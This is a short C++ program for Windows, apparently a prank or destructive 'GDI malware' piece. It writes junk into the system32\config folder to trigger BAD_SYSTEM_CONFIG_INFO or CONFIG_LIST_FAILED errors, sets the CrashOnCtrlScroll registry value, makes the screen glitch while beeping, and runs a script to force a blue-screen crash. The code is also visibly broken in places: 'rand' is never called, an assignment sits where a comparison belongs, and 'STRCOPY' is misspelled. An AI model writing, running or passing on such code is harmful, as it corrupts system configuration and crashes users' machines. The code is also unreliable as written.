#include <stdlib.h> // for system();
#include <windows.h> // for gdi screen slitches
#include <iostream> // for beep

int main()
{
    HDC hdc = GetDC(NULL);
    int bv = rand % 2 /*random binary number selection (1 and 0)*/, w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    system("cd C:\\Windows\\system32\\config");
    if (bv = 1)
    {
        system("echo 5=fuf7GhI^=^=S y s ^@ .B l u e s c r e e n^=^↓=3fdgh4c > OSDATA"); // for BAD_SYSTEM_CONFIG_INFO
    }
    else
    {
        system("mkdir OSDATA"); // for CONFIG_LIST_FAILED
    }
    system("reg add HKLM\SYSTEM\CurrentControlSet\services\kbdhid\Parameters /v CrashOnCtrlScroll /d 1"); // for MANUALLY_INITIATED_CRASH(1)
    for (int a = 0; a < 20; a++)
    {
        BitBlt(hdc, w, h, rand() % w + 1, rand () % h + 1, 1920, 1080, bv, STRCOPY);
        PatBlt(hdc, w, h, 1920 * 1080, PATINVERT);
        std::cout << "\a";
    }
    system("cscript ctrlscrolllock.vbs //nologo"); // trigger bsod MANUALLY_INITIATED_CRASH(1) then BAD_SYSTEM_CONFIG_INFO or CONFIG_LIST_FAILED
    return 0;
}